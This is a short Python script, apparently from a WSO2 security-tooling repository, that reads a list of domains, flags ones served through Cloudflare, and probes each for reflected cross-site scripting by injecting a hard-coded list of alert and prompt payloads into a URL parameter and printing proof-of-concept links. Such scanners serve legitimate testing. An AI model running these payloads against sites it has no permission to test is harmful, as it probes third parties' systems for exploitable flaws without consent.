# !/usr/bin/env python

# Copyright (c) 2020, WSO2 Inc. (http://www.wso2.org) All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests

# Checks whether the requested website is behind a Cloudflare server
def check_cloudflare(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with status code:", sc.status_code)
    except:
        print("[!] Error with the first request")
        exit()
    
    req = requests.get(url)

    try:
        if req.headers["server"] == "cloudflare":
            print("[!] The server is behind a CloudFlare server")
            return True
    except:
        return False

# Checks whether the requested website is vulnerable to XSS by using a predefined set of payloads
def check_xss(url):
    xssResults = []
    payloads = ['"-prompt(8)-"','";a=prompt,a()//','"onclick=prompt(8)>"@x.y"','\'-alert(1)//','</script><svg onload=alert(1)>','<script>alert("inject")</script>', '<image/src/onerror=prompt(8)>', '<x onclick=alert(1)>click this!']

    print("[!] Testing XSS started")

    splitUrl = url.split("=")
    newUrl = splitUrl[0] + '='
    for pl in payloads:
        urlWithPayload = newUrl + pl
        re = requests.get(urlWithPayload).text
        if pl in re:
            xssResults.append(pl)
        else:
            pass

    if len(xssResults) == 0:
        print("[!] Was not possible to exploit XSS")
    else:
        print("[+]",len(xssResults)," payloads were found")
        for p in xssResults:
            print("\n[*] Payload found!")
            print("[!] Payload:",p)
            print("[!] POC:",newUrl+p)


filePath = input("Enter domains file path: ")

with open(filePath) as file:
    for domainUrl in file:
        res = check_cloudflare(domainUrl)

        if res:
            opt = ["Yes","yes","Y","y"]

            ex = input("[!] Exit y/n: ")
            if ex in opt:
                exit()
            else:
                check_xss(domainUrl)
        else:
            check_xss(domainUrl)